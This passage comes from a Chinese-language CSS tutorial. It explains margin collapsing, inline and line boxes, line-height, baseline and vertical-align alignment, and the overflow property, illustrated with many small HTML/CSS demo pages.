两个相邻的内联盒子。它们之间的间隔当然只是左右的外边距起作用，两个相靠近的外边距不管正负，都是累积的，也就说不会发生折叠。其他的具有内联性质的比如inline-block也是如此。然后垂直方向就不要考虑了，因为他们有line box隔离了相邻两行。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        .outer { width: 200px; border: 2px solid green; padding: 25px; margin-bottom: 25px; }\n        .inner { display: inline; }\n        .left1 { margin-right: 10px; border: 1px solid red; } /* 可以试着改一下margin-right*/\n        .right1 { margin-left: 10px; border: 1px solid blue; }\n        .left2 { margin-right: -10px; border: 1px solid red; } /* 可以试着改一下margin-right*/\n        .right2 { margin-left: 10px; border: 1px solid blue; }\n        .left3 { margin-right: -10px; border: 1px solid red; } /* 可以试着改一下margin-right*/\n        .right3 { margin-left: -10px; border: 1px solid blue; }\n        </style>\n    </head>\n    <body>\n        <div class="outer">\n            <div class="inner left1">ABCDEF</div>\n            <div class="inner right1">GHIJKL</div>\n        </div>\n        <div class="outer">\n            <div class="inner left2">ABCDEF</div>\n            <div class="inner right2">GHIJKL</div>\n        </div>\n        <div class="outer">\n            <div class="inner left3">ABCDEF</div>\n            <div class="inner right3">GHIJKL</div>\n        </div>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    \n\n 3. 四个相邻的浮动元素。相靠近的左右外边距是累积的，相靠近的上下外边距也是累积的，但是它可以在浮动规则下尽可能的往上靠。什么意思呢？元素都左浮动，上一行在左边比较“低”，而在右边比较“高”（活动空间比左边多），那么浮动元素宁愿将左边位置空出来都要去右边位置高的地方。\n    \n    <html>\n     <head>\n         <style type="text/css">\n         /*设置224的原因，2个宽度就是200，左右外边距最大是20，有4个1px的边界*/\n         .outer { display: flow-root; width: 224px; border: 2px solid green; padding: 25px; }\n         .inner { float: left; width: 100px; height: 20px;}\n         .cell1 { margin-right: 10px; margin-bottom: 10px; border: 1px solid red; }\n         .cell2 { margin-left: 10px; margin-bottom: -5px; height: 25px; border: 1px solid blue; }\n         .cell3 { margin-right: -10px; margin-top: -5px; margin-bottom: 0px; height: 25px; border: 1px solid red; }\n         .cell4 { margin-left: -10px; margin-top: 0px; margin-bottom: 0px; border: 1px solid blue; }\n         </style>\n     </head>\n     <body>\n         <div class="outer">\n             <div class="inner cell1">cell1</div>\n             <div class="inner cell2">cell2</div>\n             <div class="inner cell3">cell3</div>\n             <div class="inner cell4">cell4</div>\n         </div>\n     </body>\n     <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 4. 两个块级元素嵌套，如果父级元素没有设置边框或者没有设置内边距或者没有其他内容将父子隔开，那么子级元素设置的上下外边距就会与父级的上下外边距进行折叠。除了改变父级的盒子设置，还可以将子元素改为内联块级元素，或者使用BFC，都可解决折叠问题。\n    \n     <html>\n     <head>\n         <style type="text/css">\n         .outer { width: 200px; margin: 5px; background-color: blue; }\n         .inner { height: 25px; border: 1px solid red; margin: 30px; }\n         </style>\n     </head>\n     <body>\n         <div class="outer">\n             <div class="inner">AAA</div>\n         </div>\n         \x3c!--先看上面这一个outer，父子的上下外边距是否折叠。然后再打开下面的注释，看两个同样的outer是否也折叠上下外边距--\x3e\n         \x3c!--<div class="outer">\n             <div class="inner">AAA</div>\n         </div>--\x3e\n     </body>\n     <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    \n\n其实不止相邻元素的上下外边距会有折叠，其实父子元素的上边距也可能会折叠。如果父元素没有边框，那么它们与顶部的距离就是父子上外边距里的最大值，并且父子上下之间是紧紧贴在一起的（也就是子元素的外边距不起作用了，原因是父元素没有边框，效果直接传递到父元素了）。比如父元素的上外边距是20px，子上外边距是50px，那么它们与顶部的距离就是50px。\n\n<html>\n<head>\n    <style>\n        .outer {\n            width: 200px;\n            height: 200px;\n            background-color: red;\n            margin: 20px 0 0 0;\n            /* 加上边框或者BFC就可以解决父子上外边距折叠问题 */\n            /*border: 1px  green solid;*/\n        }\n        .inner {\n            width: 100px;\n            height: 100px;\n            background-color: blue;\n            /* 左右外边距是正常的 */\n            margin: 50px 0 0 50px;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 五、内联元素的排列\n\n块级元素的排列还是很简单的，展示尺寸控制水平和垂直的展示效果，布局尺寸直接占满父级内容的一行（margin可取负数，情况稍微复杂点，上一节说过），而垂直方向上的布局尺寸就是正常表现了，没什么可说的，自己回顾上一节的内容。\n\n而内联元素的排列，在水平方向上展示尺寸和布局尺寸是正常表现，但是在垂直方向上元素的上下内外边距并不会推开其他内联元素，它有自己的一套展示规则。\n\n\n# 5.1 替换元素与非替换元素\n\n替换元素（replaced element）：元素本身是不具有内容的，但是可以由它的一些属性决定它的最终展示内容（比如src）。可以理解为元素本身的内容被替换掉了，或者说一些内容嵌入到了这个元素中。\n\n替换元素的特点：最终的展示内容可以提前通过width和height来控制，如果你没有使用这两个来控制大小，它的内容是具有一个原始尺寸，这个原始尺寸会成为最终的展示效果大小。\n\n非替换元素（nonreplaced element）：与替换元素相反，自己有内容也会成为最终的展示内容，不会被元素其他属性引来的内容所替换。\n\n<img>、<input>、<textarea>、<select>、<object>等是h5以前常见的替换元素，h5新增了<video>、<canvas>、<menu>等替换元素。其他大部分HTML元素是非替换元素。\n\n绝大部分替换元素是具有内联性质的，而又因为替换元素的内容具有原始尺寸的特点（意思是你具有内联性质却还能用width和height来控制），所以在后面讨论内联元素的排列时会拿内联非替换元素来说，而不是内联替换元素（也不会拿内联块级来说）。那么其实剩下的内联元素基本就是和文本有关的，讨论内联元素的排列时可以与下一章的内容（字体与文本属性）一起看。\n\n\n# 5.2 inline box和line box\n\n我们知道内联非替换元素在正常布局流上的排列，是从左到右（ltr），排满后换到下一行继续排列。如下概念图。\n\n\n\n回想一下内联元素的表现，最后两条“表现”的内在意思是什么？其实就是，视觉效果依旧，布局在水平上依旧但垂直方向上无效了。四周的contentArea + paddingArea + borderArea仍旧影响到内联元素的展示效果，并且contentArea + 左右paddingArea + 左右borderArea + 左右marginArea可以推开（左右）相邻的内联元素（左右外边距取负值还能拉近），而contentArea + 上下paddingArea + 上下borderArea + 上下marginArea却不会推开（上下）相邻的内联元素（上下外边距取负值也不能拉近）。搞不明白的去看布局尺寸与展示尺寸。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            font-size: 20px;\n            line-height: 20px;\n            width: 280px;\n            border: 1px solid;\n            margin: 0;\n        }\n        /* 上下视觉效果（contentAre+paddingArea+borderArea）还是有的，左右可以推开，上下却不行*/\n        /* 然后padding改为margin，视觉效果回到了contentAre（因为padding没了），左右可以推开，上下却不行*/\n        span { padding: 50px 30px; background-color: red; opacity: 0.7; }\n    </style>\n</head>\n<body>\n    <div class="parent">This is text, this is text, this is text, <span>this is text,</span> this is text.</div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n上下推不开的原因是每一行都有一个line box，是一整行的实际渲染区域。如下概念图。因为不可能让一行所有内联非替换元素的padding和margin等，都去影响相邻行的内联非替换元素，引入line box可以让相邻行以整行的形式相互影响。line box这个概念非常像块级元素，占据一行。区别还是蛮大的，相邻行的line box紧挨着的，并没有什么内外边距和边界；不能设置固定宽高，它的宽高是由内部所有的内联元素共同决定的。\n\n\n\nline box隔绝了相邻行里内联非替换元素之间的影响，内联非替换元素对line box也是不会使用margin进行什么推开和拉近的。因为内联非替换元素有自己的inline box，并且有vertical-align和line-height来决定内联非替换元素在垂直方向上的摆放。inline box是内联元素的渲染区域，inline box的高度在大部分情况下就是该内联元素的line-height的值。（内联替换元素或者内联块级元素时，inline box的高度是布局尺寸高度。）\n\n\n\ninline box与line box的关系：line box包含了一行所有的inline box。一行中最高的inline box的顶部会构成line box的顶部，一行中最低的inline box的底部会构成line box的底部。如下图，稍微严谨一点的图了。\n\n\n\n\n# 5.3 line-height和baseline\n\n因为在前面说过“不可能让一行所有内联非替换元素的padding和margin等都去影响相邻行的内联非替换元素”，所以引进了line box。但是行与行之间，或者说文字之间的上下空隙总得有，不然会不美观。所以有了行高line-height，它主要是给内联非替换元素开辟垂直空间的，也就是决定了内联非替换元素的inline box高度（然后间接影响到line box的高度）。\n\n内联非替换元素的内容常见的就是文字，font-size会决定文字的显示高度（它是一个影响因素），css会让line-height减去font-size，再将得到的值也就是leading平分为两半，一半放在文字的上方，一半放在文字的下方。如果line-height没有显式设置，那浏览器会给个默认值（1.2或1.4等等，具体看浏览器了）。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            font-size: 20px;\n            line-height: 20px; /* 值改为10px、20px、40px试试 */\n            width: 200px;\n            border: 1px solid;\n        }\n    </style>\n</head>\n<body>\n    <div class="parent">This is text, this is text, this is text.</div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n当遇到复杂场景时，比如一行的文字大小不一或者内联非替换元素内容高低不一，它们在垂直方向上应该是怎样摆放的？我们来介绍最基本也是css默认的一种方式——baseline对齐。baseline（基线）是用于在上面放置字符的一条假象的基准线，在英文字体中，baseline通常是小写字母x的底部边缘（其他字符可能有下沉，比如g和p等等），如下图。其实汉字与另外一些文字是其实没有基线概念的，但在css中还是让它们按照英文的基线对齐的（也可以使用vertical-align其他值）。\n\n\n\n我们看下面这个例子。Xx的font-size从20px增大到80px，Xx一直在基线上，而Xx的inline box上移了。原因是字体的中心（line-height的中心）与Xx基线的距离越来越远。\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        font-family: Arial ;\n        font-size: 20px;\n        line-height: 40px;\n        width: 600px;\n        border: 1px solid;\n    }\n    /* 将font-size从20px变为80px */\n    .text2 { font-size: 20px; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { bottom: 0; left: 0; width: 94px; height: 40px; }\n    .text2::after { top: 0; left: 94px; width: 85px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">Expensive</span> <span class="text2">Xx</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# 5.4 vertical-align\n\nvertical-align是内联非替换元素的垂直对齐方式，默认值是baseline也就是上一小节说的基线对齐。它还有其他值，sub | super | top | text-top | middle | bottom | text-bottom | <length> | <percentage>。\n\nvertical-align: baseline：垂直对齐方式的默认值。让子元素的baseline与父元素内部的baseline对齐，更具体点是子元素的baseline会与它当前所在行的baseline对齐。\n\n一行里所有使用baseline对齐方式的内联非替换元素，这些元素的baseline与line box顶部的距离，距离最大的那个元素的baseline就是当前所在行的baseline位置。绝大数情况下（排除内联替换元素和内联块级元素），一行里字体最大的文本，它的line-height所在的中心点与它的baseline的距离最大，那么它的baseline就成了这一行的baseline。\n\n上面这种是对内的，而父元素对外暴露的baseline会有两种情况，一是内部有inline box并且没有溢出处理（下一节会讲），那最后一个inline box的baseline就是父元素对外暴露的baseline（简单来说就是最后一行的baseline）；二是内部没有inline box或者有溢出处理，那对外暴露的baseline就是父元素的margin-bottom位置。\n\nvertical-align: top：让元素的inline box顶部与当前行的line box顶部进行对齐。\nvertical-align: bottom：让元素的inline box底部与当前行的line box底部进行对齐。\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        font-family: Arial ;\n        font-size: 20px;\n        line-height: 40px;\n        width: 400px;\n        border: 1px solid;\n    }\n    /* 将font-size从20px变为80px */\n    .text2 { font-size: 80px; }\n    /* top可以改为bottom */\n    .text3 { font-size: 60px; vertical-align: top; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { bottom: 0; left: 0; width: 94px; height: 40px; }\n    .text2::after { top: 0; left: 94px; width: 100px; height: 40px; }\n    /* 如果对齐模式由top改为bottom后，这里的top也要改为bottom */\n    .text3::after { top: 0; left: 194px; width: 75px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">Expensive</span> <span class="text2">Xx</span> <span class="text3">Ss</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n上面代码的效果图：\n\n\nvertical-align: text-top：让元素的inline box顶部与父元素的字体顶部进行对齐。\nvertical-align: text-bottom：让元素的inline box底部与父元素的字体底部进行对齐。\n\n“父元素的字体顶部”的解释：父元素里设置font-size大小的文字，放在父元素内部显示时，文字所占的区域（F12鼠标悬浮在字体上时显现的字体框）。并不是文字的inline-box也不是line-box。\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        font-family: Arial ;\n        font-size: 20px;\n        line-height: 40px;\n        width: 400px;\n        border: 1px solid;\n    }\n    .text3 { font-size: 15px; vertical-align: text-top; }\n    .text4 { font-size: 15px; vertical-align: bottom; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { top: 0; left: 0; width: 95px; height: 40px; }\n    .text2::after { bottom: 17px; left: 95px; width: 28px; height: 23px; }\n    .text3::after { bottom: 0; left: 123px; width: 76px; height: 40px; }\n    .text4::after { bottom: 0; left: 199px; width: 75px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">Expensive</span> <span class="text2">Xx</span> <span class="text3">Expensive</span> <span class="text4">Expensive</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n上面代码的效果图：\n\n\n上面例子分析：可以看到第二个框我们没有画inline box，而是画的是文字的实际区域，第三个<span>设置的是text-top对齐，那么第三个<span>设对应的inline box的顶部会与第二个框的顶部进行对齐。这样会导致整行的line box底部被顶下去，那么第四个<span>设置的bottom对齐就会在实际过程中与第三个<span>inline box的底部对齐（因为第三个<span>inline box是目前最低的inline box）。\n\nvertical-align: middle：让元素的中部与父元素内部baseline再加上x-height/2的位置进行对齐。x-height/2就是父元素使用字体里的小写字母x的一半。\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        /*这种字体下的middle对齐，inline box以及最终的line-height高度都是line-height值*/\n        /*其他字体可能因为x-height值不准确的缘故，会导致最后line box高度与line-height值有一点点误差*/\n        font-family: Courier New;\n        font-size: 20px;\n        line-height: 40px;\n        width: 400px;\n        border: 1px solid;\n    }\n    .text3 { font-size: 40px; vertical-align: middle; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { bottom: 0; left: 0; width: 114px; height: 40px; }\n    .text2::after { bottom: 9px; left: 114px; width: 36px; height: 23px; }\n    .text3::after { bottom: 0; left: 150px; width: 59px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">Expensive</span> <span class="text2">Xx</span> <span class="text3">Ss</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n上面代码的效果图：\n\n\nvertical-align: sub：让元素的baseline与父元素内部下标基线（下标点符号）进行对齐。\nvertical-align: super：让元素的baseline与父元素内部上标基线（上标点符号）进行对齐。\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        font-family: Arial ;\n        font-size: 20px;\n        line-height: 40px;\n        width: 400px;\n        border: 1px solid;\n    }\n    .text3 { font-size: 40px; vertical-align: sub; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { bottom: 0; left: 0; width: 95px; height: 40px; }\n    .text2::after { top: 11px; left: 95px; width: 66px; height: 23px; }\n    .text3::after { top: 0; left: 107px; width: 54px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">Expensive</span> <span class="text2">,</span> <span class="text3">Ss</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n上面代码的效果图：\n\n\nvertical-align的另外两种取值:\n\n * <length>使元素的baseline对齐到父元素内部baseline之上的给定长度。可以是负数。\n * <percentage>使元素的baseline对齐到父元素内部baseline之上的给定百分比，该百分比是line-height属性的百分比。可以是负数。\n\n\n# 5.5 替换元素和内联块级的影响\n\n内联非替换元素的内外边距是不参与它的inline box高度的，而替换元素和内联块级元素的内外边距是参与它的inline box高度的。那么行高line-height，就影响不到替换元素和内联块级元素，必须得考虑上下内外边距了。\n\n替换元素和内联块级元素相似的点在于它们都具有内联性质，但又具有宽高设置。区别在于替换元素的内容是由属性决定或者被嵌入，而内联块级元素的内容就是自己的contentArea区域。\n\n两者内容的区别也会导致两者对外暴露baseline的不同，替换元素没有子元素，自己的contentArea区域也不会生效，那么替换元素对外暴露的基线就是margin-bottom位置了。\n\n内联块级元素因为有自己的contentArea区域，会根据内容来确定对外暴露的baseline。当内部有inline box并且没有溢出处理（下一节会讲），那最后一个inline box对应的基线就是对外暴露的基线（简单来说就是最后一行的baseline）；当内部没有inline box或者有溢出处理，那对外暴露的基线就是margin-bottom位置。\n\n最后还有一个注意事项，line-height对替换元素和内联块级元素的间接影响。即使line-height没有设置但还会有默认值（1.2或1.4等），那么替换元素和内联块级元素在与文字进行类似于图文混排时，就会出现底边空白间隙的问题，这个就是line-height给文字加上下half-leading的影响。解决办法可以更改line-height，或者换其他对齐方式，如果只有图片可以将font-size设为0。\n\n我们来看三个例子，前两个讲了两种基线情况，最后一个讲text-top对齐。\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        font-family: Arial ;\n        font-size: 20px;\n        line-height: 40px;\n        width: 400px;\n        border: 1px solid;\n    }\n    .text2 {\n        display: inline-block;\n        width: 40px;\n        height: 40px;\n        box-sizing: border-box;\n        border: 1px solid blue;\n        margin-top: 20px;       /*现在的line box顶部就是由inline-block的margin-top决定的*/\n        margin-bottom: 30px;    /*这个margin-bottom要与父元素的baseline对齐*/\n        vertical-align: baseline;\n    }\n    .text3 { font-size: 70px; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after, .parent div::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { bottom: 0; left: 0; width: 97px; height: 40px; }\n    .text2::after { top: 0; left: 97px; height: 90px; width: 42px;}\n    .text3::after { bottom: 18px; left: 139px; width: 92px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">Expensive</span> <div class="text2"></div> <span class="text3">Ss</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n上面代码的效果图：\n\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        font-family: Arial ;\n        font-size: 20px;\n        line-height: 40px;\n        width: 400px;\n        border: 1px solid;\n    }\n    .text2 {\n        display: inline-block;\n        width: 40px;\n        height: 40px;\n        box-sizing: border-box;\n        border: 1px solid blue;\n        margin-top: 20px;       /*现在的line box顶部就是由inline-block的margin-top决定的*/\n        margin-bottom: 30px;    /*现在的line box底部就是由inline-block的margin-bottom决定的*/\n        vertical-align: baseline;\n    }\n    .text3 { font-size: 70px; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after, .parent div::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { bottom: 30px; left: 0; width: 97px; height: 40px; }\n    .text2::after { top: 0; left: 97px; height: 90px; width: 42px;}\n    .text3::after { top: 2px; left: 139px; width: 92px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">Expensive</span> <div class="text2">Xx</div> <span class="text3">Ss</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n上面代码的效果图：\n\n\n<html>\n<head>\n    <style type="text/css">\n    .parent {\n        font-family: Arial ;\n        font-size: 20px;\n        line-height: 40px;\n        width: 400px;\n        border: 1px solid;\n    }\n    .text2 {\n        display: inline-block;\n        width: 40px;\n        height: 40px;\n        box-sizing: border-box;\n        border: 1px solid blue;\n        margin-top: 20px;       /*这个margin-top要与父元素的文字元素顶部对齐*/\n        margin-bottom: 30px;    /*现在的line box底边就是由inline-block的margin-bottom决定的*/\n        vertical-align: text-top;\n    }\n    .text3 { font-size: 70px; }\n    /* 以下是调试代码 */\n    .parent { position: relative; }\n    .parent span::after, .parent div::after {\n        content: \'\';\n        position: absolute;\n        border: 1px solid red;\n        box-sizing: border-box;\n    }\n    .text1::after { top: 17px; left: 0; width: 97px; height: 40px; }\n    .text2::after { bottom: 0; left: 97px; height: 90px; width: 42px;}\n    .text3::after { top: 0; left: 139px; width: 92px; height: 40px; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <span class="text1">Expensive</span> <div class="text2"></div> <span class="text3">Ss</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n上面代码的效果图：\n\n\n\n# 六、溢出overflow\n\n盒子无法容纳太多内容时会发生溢出（overflow），css提供了几种解决溢出的方案，在元素上使用overflow属性，其值可以是visible、hidden、scroll、auto。如果只是单独对一个方向指定，那就是overflow-x或overflow-y属性了。\n\n\n# 6.1 visible\n\noverflow属性默认是visible，也就是仍然显示溢出内容，因为css不会让内容自动消失或者做其他处理，这会方便开发者去发现问题并自由灵活地处理。\n\n\n# 6.2 hidden\n\noverflow属性设置hidden，表示超出部分隐藏。父元素设置了overflow: hidden，如果子级元素的边界超过了父级元素的边界，就会截取掉超出的部分（超出部分隐藏）。其实就是子级元素的展示效果超出就会被截取。\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            width: 100px;\n            height: 100px;\n            overflow: hidden;\n            padding: 20px; /*并不会按照父级的padding来截取超过部分，而是按照border*/\n            border: 1px solid;\n        }\n        .inner {\n            /* 子元素显示设置宽高，父元素有20px内边距 */\n            width: 100px;\n            height: 100px;\n            /* 子元素使用负值外边距，减少了布局尺寸，子元素向上位移20px，向左位移40px */\n            /* 位移后，子元素的上边界与父元素的上边界重合，子元素的左边界超出父元素左边界20px */\n            margin-top: -20px; /* 计算过程 20 - 20 = 0 */\n            margin-left: -40px; /* 计算过程 20 - 40 = -20 */\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            width: 100px;\n            height: 100px;\n            overflow: visible;\n            /*并不会按照父级的padding来截取超过部分，而是按照border*/\n            padding: 20px;\n            border: 1px solid;\n        }\n        .inner {\n            /* 子元素显示设置宽高，父元素有20px内边距 */\n            /* 子元素使用正值外边距，加大了布局尺寸 */\n            margin: 20px 20px 20px 0;\n            /* 子元素的下边界超出父元素的下边界2px，子元素的右边界超出父元素右边界2px */\n            width: 122px;  /* 父右边界-子右边界：(20+100+20) - (20+122) = -2 */\n            height: 102px; /* 父下边界-子下边界：(20+100+20) - (20+20+102) = -2 */\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n还有一个经典的例子，使用overflow: hidden配合展示尺寸与布局尺寸来实现等高布局。\n\n\n# 6.3 scroll\n\noverflow属性设置为scroll，表示该元素添加一个滚动条，用来滚动展示内部元素。父元素设置了overflow: scroll，如果子元素布局尺寸超过了父级的contentArea（块级水平方向得注意，下面会说），那就会为父元素添加滚动条。\n\n滚动条是有滚动底纹的，这个底纹也会占据contentArea的空间，一般都是17px。使用overflow: scroll，会先给两个方向都加上滚动底纹（不管有没有溢出），单独使用overflow-x或overflow-y会只给一个方向加滚动底纹，但也是不管有没有溢出都会加上滚动底纹。\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            width: 100px;\n            height: 100px;\n            overflow: scroll; /* 先加了两个滚动底纹，会占去17px的空间，溢出时再添加滚动条 */\n            padding: 20px;\n            border: 1px solid;\n        }\n        .inner {\n            display: inline-block;\n            margin: 10px;\n            width: 64px;  /* 此时布局尺寸为64+10+10=84，再加上滚动条的17那就是101，比父级内容宽度100多出1px，所以会有滚动条 */\n            height: 64px; /* 此时布局尺寸为64+10+10=84，再加上滚动条的17那就是101，比父级内容高度100多出1px，所以会有滚动条 */\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n块级元素的水平方向滚动条触发比较特殊，因为块级元素的隐藏等式导致布局尺寸就是父级内容宽度，那么水平方向滚动条的触发条件就得换成边框超过就算触发（展示效果超过就触发）。同样情况的有display: table。\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            width: 100px;\n            height: 100px;\n            overflow: scroll; /* 先加了两个滚动底纹，会占去17px的空间，溢出时再添加滚动条 */\n            padding: 20px;\n            border: 1px solid;\n        }\n        .inner {\n            display: block; /*块级元素的水平方向会特殊一些*/\n            margin: 10px;\n            width: 94px;  /* 此时子元素水平右边框距离父元素左内边距是10+94+17=121，而父元素水平右边框距离父元素左内边距是100+20=121，刚好多出1px，所以会有滚动条 */\n            height: 64px; /* 此时布局尺寸为64+10+10=84，再加上滚动条的17那就是101，比父级内容高度100多出1px，所以会有滚动条 */\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# 6.4 auto\n\noverflow属性设置为auto，跟scroll意思差不多，也是在溢出时添加滚动条。区别就是auto在没有溢出时不会添加滚动底纹，溢出的时候再添加滚动底纹和滚动条，那么在触发溢出前也不会被白白占去17px的空间了（溢出后也不会）。\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            width: 100px;\n            height: 100px;\n            overflow: auto; /* 触发溢出后才会加滚动底纹和滚动条，不会占去17px的空间 */\n            padding: 20px;\n            border: 1px solid;\n        }\n        .inner {\n            display: inline-block;\n            margin: 10px;\n            width: 81px;  /* 此时布局尺寸为81+10+10=101，比父级内容宽度100多出1px，所以会有滚动条 */\n            height: 81px; /* 此时布局尺寸为81+10+10=101，比父级内容高度100多出1px，所以会有滚动条 */\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            width: 100px;\n            height: 100px;\n            overflow: auto; /* 触发溢出后才会加滚动底纹和滚动条，不会占去17px的空间 */\n            padding: 20px;\n            border: 1px solid;\n        }\n        .inner {\n            display: block; /*块级元素的水平方向会特殊一些*/\n            margin: 10px;\n            width: 111px;  /* 